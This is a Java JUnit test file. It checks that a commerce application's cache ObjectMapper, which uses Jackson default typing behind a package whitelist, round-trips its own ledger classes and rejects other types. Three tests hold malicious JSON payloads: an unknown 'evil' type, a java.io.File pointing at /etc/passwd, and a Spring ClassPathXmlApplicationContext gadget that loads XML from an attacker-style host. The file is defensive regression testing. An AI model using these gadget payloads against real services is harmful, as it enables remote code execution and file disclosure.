package com.personal.marketnote.commerce.configuration;

import com.fasterxml.jackson.annotation.JsonAutoDetect;
import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.annotation.PropertyAccessor;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.exc.InvalidTypeIdException;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
import com.fasterxml.jackson.datatype.hibernate5.jakarta.Hibernate5JakartaModule;
import com.fasterxml.jackson.datatype.jdk8.Jdk8Module;
import com.fasterxml.jackson.datatype.jsr310.JavaTimeModule;
import com.personal.marketnote.commerce.domain.ledger.Account;
import com.personal.marketnote.commerce.domain.ledger.AccountSnapshotState;
import com.personal.marketnote.commerce.domain.ledger.AccountType;
import com.personal.marketnote.common.domain.EntityStatus;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.math.BigDecimal;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * CacheConfig ObjectMapper 직렬화/역직렬화 왕복 테스트.
 * <p>
 * PolymorphicTypeValidator 화이트리스트(#4856) 적용 후 라운드트립이 정상 동작하는지,
 * 화이트리스트 외 패키지는 InvalidTypeIdException을 일으키는지 검증한다.
 */
class CacheConfigObjectMapperTest {

    private ObjectMapper createCacheObjectMapper() {
        ObjectMapper mapper = new ObjectMapper();
        mapper.activateDefaultTyping(
                BasicPolymorphicTypeValidator.builder()
                        .allowIfSubType("com.personal.marketnote.")
                        .allowIfSubType("java.util.")
                        .allowIfSubType("java.time.")
                        .allowIfSubType("java.math.")
                        .allowIfSubType("java.lang.")
                        .build(),
                ObjectMapper.DefaultTyping.NON_FINAL,
                JsonTypeInfo.As.PROPERTY
        );
        mapper.setVisibility(PropertyAccessor.GETTER, JsonAutoDetect.Visibility.NONE);
        mapper.setVisibility(PropertyAccessor.IS_GETTER, JsonAutoDetect.Visibility.NONE);
        mapper.setVisibility(PropertyAccessor.SETTER, JsonAutoDetect.Visibility.NONE);
        mapper.setVisibility(PropertyAccessor.FIELD, JsonAutoDetect.Visibility.ANY);
        mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);
        mapper.registerModule(new Jdk8Module());
        mapper.registerModule(new Hibernate5JakartaModule());
        mapper.registerModule(new JavaTimeModule());
        return mapper;
    }

    private Account createTestAccount() {
        return Account.from(
                AccountSnapshotState.builder()
                        .id(1L)
                        .name("PG_RECEIVABLE")
                        .accountType(AccountType.ASSET)
                        .status(EntityStatus.ACTIVE)
                        .createdAt(LocalDateTime.of(2026, 1, 1, 0, 0))
                        .modifiedAt(LocalDateTime.of(2026, 1, 1, 0, 0))
                        .build()
        );
    }

    @Test
    @DisplayName("Account 단일 객체 라운드트립이 성공한다 (com.personal.marketnote. 화이트리스트 통과)")
    void account_shouldRoundTrip() throws JsonProcessingException {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        Account account = createTestAccount();

        // when
        String json = mapper.writeValueAsString(account);
        Object deserialized = mapper.readValue(json, Object.class);

        // then
        assertThat(deserialized).isInstanceOf(Account.class);
        Account result = (Account) deserialized;
        assertThat(result.getId()).isEqualTo(1L);
        assertThat(result.getName()).isEqualTo("PG_RECEIVABLE");
        assertThat(result.getAccountType()).isEqualTo(AccountType.ASSET);
        assertThat(result.isActive()).isTrue();
    }

    @Test
    @DisplayName("ArrayList<Account> 라운드트립이 성공한다 (java.util. 화이트리스트 통과)")
    void accountArrayList_shouldRoundTrip() throws JsonProcessingException {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        List<Account> accounts = new ArrayList<>(List.of(createTestAccount()));

        // when
        String json = mapper.writeValueAsString(accounts);
        Object deserialized = mapper.readValue(json, Object.class);

        // then
        assertThat(deserialized).isInstanceOf(List.class);
        List<?> resultList = (List<?>) deserialized;
        assertThat(resultList).hasSize(1);
        assertThat(resultList.get(0)).isInstanceOf(Account.class);
    }

    @Test
    @DisplayName("BigDecimal/LocalDateTime 라운드트립이 성공한다 (java.math/java.time 화이트리스트 통과)")
    void bigDecimalAndLocalDateTime_shouldRoundTrip() throws JsonProcessingException {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        List<Object> mixed = new ArrayList<>();
        mixed.add(BigDecimal.valueOf(12345.67));
        mixed.add(LocalDateTime.of(2026, 4, 25, 12, 0));

        // when
        String json = mapper.writeValueAsString(mixed);
        Object deserialized = mapper.readValue(json, Object.class);

        // then
        assertThat(deserialized).isInstanceOf(List.class);
        List<?> resultList = (List<?>) deserialized;
        assertThat(resultList.get(0)).isInstanceOf(BigDecimal.class);
        assertThat(resultList.get(1)).isInstanceOf(LocalDateTime.class);
    }

    @Test
    @DisplayName("화이트리스트 외 패키지 클래스(com.example.evil.Foo)는 역직렬화 시 InvalidTypeIdException을 발생시킨다")
    void unwhitelistedPackage_shouldThrowInvalidTypeIdException() {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        // 화이트리스트(com.personal.marketnote., java.util., java.time., java.math., java.lang.)에 속하지 않는 type id를 가진 JSON
        String maliciousJson = "[\"com.example.evil.Foo\",{\"x\":1}]";

        // when & then
        assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
                .isInstanceOf(InvalidTypeIdException.class);
    }

    @Test
    @DisplayName("화이트리스트 외 표준 라이브러리(java.io.File)는 역직렬화 시 InvalidTypeIdException을 발생시킨다")
    void javaIoFile_shouldThrowInvalidTypeIdException() {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        String maliciousJson = "[\"java.io.File\",\"/etc/passwd\"]";

        // when & then
        assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
                .isInstanceOf(InvalidTypeIdException.class);
    }

    @Test
    @DisplayName("알려진 가젯 체인(ClassPathXmlApplicationContext)은 역직렬화 시 InvalidTypeIdException을 발생시킨다")
    void springGadgetChain_shouldThrowInvalidTypeIdException() {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        String maliciousJson =
                "[\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"http://evil.example.com/exploit.xml\"]";

        // when & then
        assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
                .isInstanceOf(InvalidTypeIdException.class);
    }
}
